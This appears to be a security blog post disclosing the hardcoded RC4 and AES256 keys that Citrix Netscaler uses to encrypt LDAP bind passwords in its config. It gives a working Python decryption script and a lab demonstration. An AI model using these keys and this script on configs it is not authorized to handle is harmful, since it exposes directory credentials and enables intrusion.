---
layout: page
title: Citrix Netscaler config decryption
permalink: /citrix-decrypt/
---

## Netscaler

Citrix Netscaler (or whatever they're calling it now) uses hardcoded encryption keys to encrypt at least some passwords stored in the appliance config, most importantly for LDAP bind passwords. As a side note - **the passwords for accessing the appliance itself via CLI or GUI are hashed, not encrypted**. You can still attempt to break these using hashcat but it requires bruteforcing.

However, some other values in the config like LDAP bind passwords are encrypted and can be recovered as by default they are encrypted by hardcoded keys that seem to be common to all Netscalers. These static encryption keys are compliled into the `libnscli90.so` library on the appliance. As of 10.5 this was the RC4 key `2286da6ca015bcd9b7259753c2a5fbc2`. At some point Citrix changed the default key and cipher used to encrypt cleartext values. The default key is now 
```
351CBE38F041320F22D990AD8365889C7DE2FCCCAE5A1A8707E21E4ADCCD4AD9
```
and the appliance now (12.0) uses AES256-CBC instead of RC4. I figured out after a quick bit of RE that the version signifier seems the be the `-encryptmethod` flag, where `ENCMTHD_3` signifies it is using AES256-CBC and the new default key.   


### Additional notes
If you add an old style (RC4) encrypted value to a newer appliance it will decrypt it, then re-encrypt using the new ENCMTHD_3 technique. A small number examples online appear to use the `ENCMTHD_2` value, which is uses the new key and AES256-ECB instead of CBC. 

*If the config line says -kek at the end you'll need to pull key encryption keys off the appliance and do a little more reversing, see [this blog post for a reference on the Netscaler KEK](https://www.ferroquesystems.com/resource/citrix-adc-security-kek-files/)*


## Decrypting
Here's a quick guide on how to decrypt these LDAP passwords:

1. If there is a `-kek` flag on the config line this means it is using a seperate key to encrypt the password instead of the hardcoded one. In theory you should be able to pull this off a compromised Netscaler but a config alone wont give you the cleartext. See [this blog post for a reference on the Netscaler KEK](https://www.ferroquesystems.com/resource/citrix-adc-security-kek-files/). I will look into doing this at some point and update this post.
2. If there is no `ENCMTHD_` value, it is likely encrypted using the original RC4 method (I'm calling this ENCMTHD_1). You can decode this using the below script. 
3. Otherwise if there is `ENCMTHD_3` or `ENCMTHD_2` and no `-kek` it uses the new AES256-CBC or AES256-ECB encryption method. You can also decode this using the below script.

An example line from a new config may look like 
```
add authentication ldapAction LDAP_mgmt -serverIP 192.168.200.130 -serverPort 636 -ldapBase "DC=citrix,DC=lab" -ldapBindDn readonly@citrix.lab -ldapBindDnPassword b65f2142d01fe706083173b064c04cfc6b81ab2417d39d63d2b3216176d0e638b89cbca0f1c4294db56b66668f94ff0f -encrypted -encryptmethod ENCMTHD_3 -ldapLoginName sAMAccountName -searchFilter "&(memberof=CN=NSG_Admin,OU=AdminGroups,DC=citrix,DC=lab)" -groupAttrName memberOf
```
indicating that it is encrypted with AES256-CBC using the default key.

Extract the ldapBindDnPassword and pass it to the script:
```
# python decitrix.py b65f2142d01fe706083173b064c04cfc6b81ab2417d39d63d2b3216176d0e638b89cbca0f1c4294db56b66668f94ff0f ENCMTHD_3
test12345678secretldappassword
```

## Decrypting script
The below python script will decrypt LDAP and likely similar encrypted values (haven't tested anything else) obtained from the config.
{% highlight python %}
#!/usr/bin/python

import base64
from Crypto.Cipher import AES,ARC4
import binascii,sys


BS = 16
unpad = lambda s : s[:-ord(s[len(s)-1:])]

#thanks  https://stackoverflow.com/a/12525165 for crypto snippet
class AESCipher:
    def __init__( self, key ):
        self.key = key

    def decrypt( self, enc, mode ):
        if mode == "ENCMTHD_2":
                cipher = AES.new(self.key, AES.MODE_ECB )
        elif mode == "ENCMTHD_3":
                iv = "\x00" * 16
                cipher = AES.new(self.key, AES.MODE_CBC, iv )

        else:
            print "Invalid mode"
            return False

        return unpad(cipher.decrypt( enc ))


def main():
        #Keys hardcoded into netscaler libnscli90.so
        aeskey = binascii.unhexlify("351CBE38F041320F22D990AD8365889C7DE2FCCCAE5A1A8707E21E4ADCCD4AD9")
        rc4key = binascii.unhexlify("2286da6ca015bcd9b7259753c2a5fbc2")

        if len(sys.argv) == 3:
            ciphertext = sys.argv[1]
            mode = sys.argv[2]

            if mode == "ENCMTHD_3" or mode == "ENCMTHD_2":
                c = AESCipher(aeskey)
                decoded = c.decrypt(binascii.unhexlify(ciphertext),mode)
                if mode == "ENCMTHD_3":
                        print decoded[16:]
                else:
                        print decoded

            elif mode == "ENCMTHD_1": #old rc4 mode
                out_cipher = ARC4.new(rc4key)
                decoded = out_cipher.decrypt(binascii.unhexlify(ciphertext))
                print decoded


if __name__ == "__main__":
        main()
{% endhighlight %}



#### Runthrough

```
>add authentication ldapAction LDAP_mgmt -serverIP 192.168.200.130 -serverPort 636 -ldapBase "DC=citrix,DC=lab" -ldapBindDn readonly@citrix.lab -ldapBindDnPassword test12345678secretldappassword -ldapLoginName sAMAccountName -searchFilter "&(memberof=CN=NSG_Admin,OU=AdminGroups,DC=citrix,DC=lab)" -groupAttrName memberOf
Done
>show running
..snip..
add authentication ldapAction LDAP_mgmt -serverIP 192.168.200.130 -serverPort 636 -ldapBase "DC=citrix,DC=lab" -ldapBindDn readonly@citrix.lab -ldapBindDnPassword b65f2142d01fe706083173b064c04cfc6b81ab2417d39d63d2b3216176d0e638b89cbca0f1c4294db56b66668f94ff0f -encrypted -encryptmethod ENCMTHD_3 -ldapLoginName sAMAccountName -searchFilter "&(memberof=CN=NSG_Admin,OU=AdminGroups,DC=citrix,DC=lab)" -groupAttrName memberOf
..snip..

# python decitrix.py b65f2142d01fe706083173b064c04cfc6b81ab2417d39d63d2b3216176d0e638b89cbca0f1c4294db56b66668f94ff0f ENCMTHD_3
test12345678secretldappassword
```

